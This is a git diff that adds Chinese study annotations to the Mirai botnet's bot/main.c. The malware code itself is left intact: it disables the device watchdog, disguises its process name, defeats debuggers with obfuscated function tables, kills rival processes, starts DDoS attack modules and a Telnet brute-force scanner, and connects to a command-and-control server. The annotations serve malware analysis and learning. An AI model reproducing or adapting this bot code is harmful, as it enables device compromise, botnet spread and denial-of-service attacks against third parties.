@@ -24,7 +24,7 @@
 #include "util.h"
 #include "resolv.h"
 
-//bot目录下的代码才是“在受感染设备上运行的恶意payload”
+//bot目录下的代码才是“在受感染设备上运行的恶意payload”【mirai端，用于和远程的C&C服务器进行通信交互】
 
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -46,7 +46,7 @@ static void segv_handler(int sig, siginfo_t *si, void *unused)
 }
 #endif
 
-int main(int argc, char **args)
+int main(int argc, char **args) // ./dvrHelper id
 {
     char *tbl_exec_succ;
     char name_buf[32];
@@ -71,20 +71,20 @@ int main(int argc, char **args)
     signal(SIGTRAP, &anti_gdb_entry);   //如果出现SIGTRAP信号，也就是调试器产生的信号，就会设置resolve_func【解析C&C域名的ip】
 
     // Prevent watchdog from rebooting device
-    //设置watchdog设备，
+    //设置watchdog设备的计时器
     if ((wfd = open("/dev/watchdog", 2)) != -1 ||   //O_RDWR
         (wfd = open("/dev/misc/watchdog", 2)) != -1)
     {
         int one = 1;
-        //watchdog.h
-        //#define	WDIOS_DISABLECARD	0x0001 【https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/watchdog.h#L53】
-        //#define	WDIOC_SETOPTIONS	_IOR(WATCHDOG_IOCTL_BASE, 4, int)   -> 0x5704
+        //watchdog.h【https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/watchdog.h#L53】
+        //#define	WDIOS_DISABLECARD	0x0001 ->  Turn off the watchdog timer
+        //#define	WDIOC_SETOPTIONS	_IOR(WATCHDOG_IOCTL_BASE, 4, int)   ->   0x5704
         //https://www.kernel.org/doc/Documentation/watchdog/watchdog-api.txt
-        ioctl(wfd, 0x80045704, &one);   
+        ioctl(wfd, 0x80045704, &one);   //关闭watchdog计时器。【直接就不可用了？】
         close(wfd);
         wfd = 0;
     }
-    chdir("/");
+    chdir("/"); //修改工作目录or当前目录
 #endif
 
 #ifdef DEBUG
@@ -107,83 +107,94 @@ int main(int argc, char **args)
         perror("sigaction");
 #endif
 
-    LOCAL_ADDR = util_local_addr();
+    LOCAL_ADDR = util_local_addr(); //获取mirai端的ip地址信息
 
     srv_addr.sin_family = AF_INET;
-    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
-    srv_addr.sin_port = htons(FAKE_CNC_PORT);
+    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;   //在调用resolve_func/resolve_cnc_addr之前，这里存储的C&C地址都是假的，调用之后才会获得真正的C&C ip和port 
+    srv_addr.sin_port = htons(FAKE_CNC_PORT);   
 
 #ifdef DEBUG
     unlock_tbl_if_nodebug(args[0]);
     anti_gdb_entry(0);
 #else
-    if (unlock_tbl_if_nodebug(args[0]))
-        raise(SIGTRAP);
+    //args[0]为dvrHelper，满足时，调用table_init，并且返回true
+    if (unlock_tbl_if_nodebug(args[0])) //【也就是说生成的可执行文件名称必须符合要求才能正确初始化】
+        raise(SIGTRAP); //触发SIGTRAP信号，触发anti_gdb_entry中的函数赋值
 #endif
 
-    ensure_single_instance();
+    ensure_single_instance();   //确保48101端口只有一个实例在运行，且是mirai payload bot
 
-    rand_init();
+    rand_init();    //随机数种子初始化【ppid、pid、clock、time】
 
-    util_zero(id_buf, 32);
+    util_zero(id_buf, 32);  //id_buf来自于args[1]
     if (argc == 2 && util_strlen(args[1]) < 32)
     {
         util_strcpy(id_buf, args[1]);
         util_zero(args[1], util_strlen(args[1]));
     }
-
-    // Hide argv0
-    name_buf_len = ((rand_next() % 4) + 3) * 4;
-    rand_alphastr(name_buf, name_buf_len);
+    //ref：https://blog.csdn.net/whatday/article/details/109253354
+    // Hide argv0  
+    name_buf_len = ((rand_next() % 4) + 3) * 4; //生成一个随机数
+    rand_alphastr(name_buf, name_buf_len);  //生成一串随机字符
     name_buf[name_buf_len] = 0;
-    util_strcpy(args[0], name_buf);
+    util_strcpy(args[0], name_buf); //随机长度的随机字符作为进程名。【两次启动的名称不一样】
+    //只会影响/proc/$pid/cmdline、ps -ef 、ps -aux
+    //不会影响ps -A或/proc/$pid/status或/proc/2874/stat或top
 
     // Hide process name
+    // PR_SET_NAME : Set the name of the calling thread【修改线程名】
+    //This is the same attribute that can be set via pthread_setname_np(3) and retrieved using pthread_getname_np(3).
     name_buf_len = ((rand_next() % 6) + 3) * 4;
     rand_alphastr(name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
     prctl(PR_SET_NAME, name_buf);
+    //修改了/prco/pid/stat及/prco/pid/status中的进程名称，使用ps -A 或者top 命令看不到原来的进程名称
+    //但是未修改/prco/pid/cmdline 的值，使用ps -ef 、ps -aux可以看到进程名称及参数
+
+    //mirai做的不好的一点是，argv0和prctl的修改没有统一。
 
     // Print out system exec
-    table_unlock_val(TABLE_EXEC_SUCCESS);
+    table_unlock_val(TABLE_EXEC_SUCCESS);   //listening tun0
     tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
-    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
+    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);    //输出listening tun0
     write(STDOUT, "\n", 1);
     table_lock_val(TABLE_EXEC_SUCCESS);
 
 #ifndef DEBUG
-    if (fork() > 0)
-        return 0;
-    pgid = setsid();
+    if (fork() > 0) //fork子进程
+        return 0;   //父进程结束
+    pgid = setsid();    //setsid帮助一个进程脱离从父进程继承而来的已打开的终端、隶属进程组和隶属的会话。
     close(STDIN);
     close(STDOUT);
     close(STDERR);
 #endif
-
-    attack_init();
-    killer_init();
+    //三个关键函数
+    attack_init();  //methods的初始化【包含多种DDos攻击类型】
+    killer_init();  //杀死可疑进程以及绑定22、23、80端口，不接收连接。【内部fork，而子进程定时不断kill】
 #ifndef DEBUG
 #ifdef MIRAI_TELNET
-    scanner_init();
+    scanner_init(); //利用弱口令来进行Telnet爆破。
+    //首先生成随机 ip，按照字典中的用户名和密码进行登录，如果成功向 report 服务器返回结果[集齐128个可用可登录的连接就不再scan了]
 #endif
 #endif
     
+    //又是一个 select 轮询的模型，设置 socket 和 accept 函数，初始化文件描述符
     while (TRUE)
     {
         fd_set fdsetrd, fdsetwr, fdsetex;
         struct timeval timeo;
         int mfd, nfds;
 
-        FD_ZERO(&fdsetrd);
+        FD_ZERO(&fdsetrd);  //将指定的文件描述符集清空
         FD_ZERO(&fdsetwr);
 
         // Socket for accept()
         if (fd_ctrl != -1)
-            FD_SET(fd_ctrl, &fdsetrd);
+            FD_SET(fd_ctrl, &fdsetrd);      //FD_SET:将fd加入set集合
 
         // Set up CNC sockets
         if (fd_serv == -1)
-            establish_connection();
+            establish_connection(); //设置fd_serv为与C&C交互的本地socket
 
         if (pending_connection)
             FD_SET(fd_serv, &fdsetwr);
@@ -199,6 +210,7 @@ int main(int argc, char **args)
         // Wait 10s in call to select()
         timeo.tv_usec = 0;
         timeo.tv_sec = 10;
+        //select轮询，10s一次，设置监听的fd集合和最大的fd值
         nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
         if (nfds == -1)
         {
@@ -207,7 +219,7 @@ int main(int argc, char **args)
 #endif
             continue;
         }
-        else if (nfds == 0)
+        else if (nfds == 0) 
         {
             uint16_t len = 0;
 
@@ -407,9 +419,10 @@ static void establish_connection(void)
 
     // Should call resolve_cnc_addr
     if (resolve_func != NULL)
-        resolve_func();
+        resolve_func(); //已经在main中anti_gdb_entry由于SIGTRAP的触发，赋值为resolve_cnc_addr【给srv_addr赋值】
 
     pending_connection = TRUE;
+    //连接C&C，将本地的相应socket对应在fd_serv中
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
 }
 
@@ -425,50 +438,52 @@ static void teardown_connection(void)
     sleep(1);
 }
 
+//确保无时无刻只有单个实例在运行。
 static void ensure_single_instance(void)
 {
     static BOOL local_bind = TRUE;
     struct sockaddr_in addr;
     int opt = 1;
 
-    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)  //TCP连接
         return;
-    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
-    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));
+    //SO_REUSEADDR是让端口释放后立即就可以被再次使用。
+    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));  //设置socket的SO_REUSEADDR选项：用于端口复用，允许多个套接字绑定同一个端口
+    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));   //设置当前socket为非阻塞模式。
 
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
-    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT);    //48101
 
     // Try to bind to the control port
     errno = 0;
-    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1) //尝试绑定本地ip的48101端口，等待server的连接
     {
         if (errno == EADDRNOTAVAIL && local_bind)
-            local_bind = FALSE;
+            local_bind = FALSE; //绑定失败，说明出现了同一个ip的同一个端口绑定（只有UDP绑定才允许两者都相同，TCP的端口复用要求ip不同）
 #ifdef DEBUG
         printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
 #endif
 
         // Reset addr just in case
         addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = INADDR_ANY;
+        addr.sin_addr.s_addr = INADDR_ANY;  //0.0.0.0(指的是本机上的所有IPV4地址)
         addr.sin_port = htons(SINGLE_INSTANCE_PORT);
 
-        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)  //既然bind失败，说明本机已经开启了一个绑定了端口的实例【可能是旧的mirai也可能是别的良性用户进程】，因此connect本地ip，一般来说是要成功的，这样做到以防万一
         {
 #ifdef DEBUG
             printf("[main] Failed to connect to fd_ctrl to request process termination\n");
 #endif
         }
         
-        sleep(5);
-        close(fd_ctrl);
-        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+        sleep(5);   
+        close(fd_ctrl); 
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));   //杀死绑定这个端口的进程，重新创建mirai实例。
         ensure_single_instance(); // Call again, so that we are now the control
     }
     else
-    {
+    {   //如果bind成功，就调用listen监听远程连接
         if (listen(fd_ctrl, 1) == -1)
         {
 #ifdef DEBUG
@@ -485,17 +500,21 @@ static void ensure_single_instance(void)
     }
 }
 
+//这里使用了代码混淆。
 static BOOL unlock_tbl_if_nodebug(char *argv0)
 {
     // ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
+    //最终的buf_dst解析完如上
     char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, buf_dst[12];
+    // buf_dst = { 0x2e, 0x2f,0x64,0x76,0x72,0x48,0x65,0x6c,0x70,0x65,0x72,0x00 }
+    // ./dvrHelper 【mirai的bot binary名称为dvrhelper】
     int i, ii = 0, c = 0;
     uint8_t fold = 0xAF;
     void (*obf_funcs[]) (void) = {
         (void (*) (void))ensure_single_instance,
         (void (*) (void))table_unlock_val,
         (void (*) (void))table_retrieve_val,
-        (void (*) (void))table_init, // This is the function we actually want to run
+        (void (*) (void))table_init, // This is the function we actually want to run【实际只是要调用table_init】
         (void (*) (void))table_lock_val,
         (void (*) (void))util_memcpy,
         (void (*) (void))util_strcmp,
@@ -506,31 +525,35 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
 
     for (i = 0; i < 7; i++)
         c += (long)obf_funcs[i];
-    if (c == 0)
+    if (c == 0) //如果所有函数的地址都是无效的，未解析的
         return FALSE;
 
     // We swap every 2 bytes: e.g. 1, 2, 3, 4 -> 2, 1, 4, 3
-    for (i = 0; i < sizeof (buf_src); i += 3)
+    for (i = 0; i < sizeof (buf_src); i += 3) //0 3 6 9 12 15 
     {
         char tmp = buf_src[i];
-
+        //dst( from src ): 0 <-1,1 <-0,2 <-4,3 <-3,4 <- 7 ,5<- 6,6 <-10,7 <-9, 8 <-13, 9<-12, 10 <-16,11 <-15.
+        //根据上述规律，其实buf_src中的\x00字符都会被过滤掉【eg：idx=2、5、8、11、14等】，剩下其他的可见字符。
         buf_dst[ii++] = buf_src[i + 1];
         buf_dst[ii++] = tmp;
 
-        // Meaningless tautology that gets you right back where you started
+        // Meaningless tautology that gets you right back where you started【冗余操作，进行完，i不会改变】
         i *= 2;
         i += 14;
         i /= 2;
         i -= 7;
 
         // Mess with 0xAF
+        //ii=2、4、6、8、10、12
+        // % 11 = 2\4\6\8\10\1
+        // ./dvrHelper
         fold += ~argv0[ii % util_strlen(argv0)];
     }
-    fold %= (sizeof (obf_funcs) / sizeof (void *));
+    fold %= (sizeof (obf_funcs) / sizeof (void *)); //%9
     
 #ifndef DEBUG
-    (obf_funcs[fold])();
-    matches = util_strcmp(argv0, buf_dst);
+    (obf_funcs[fold])();    //(obf_funcs[3])(); 【其实对于fold到底是什么可以用排除法，显然这个函数指针是没有参数的，因此肯定不是unlock之类的，反而应该是init相关的函数】
+    matches = util_strcmp(argv0, buf_dst);  
     util_zero(buf_src, sizeof (buf_src));
     util_zero(buf_dst, sizeof (buf_dst));
     return matches;
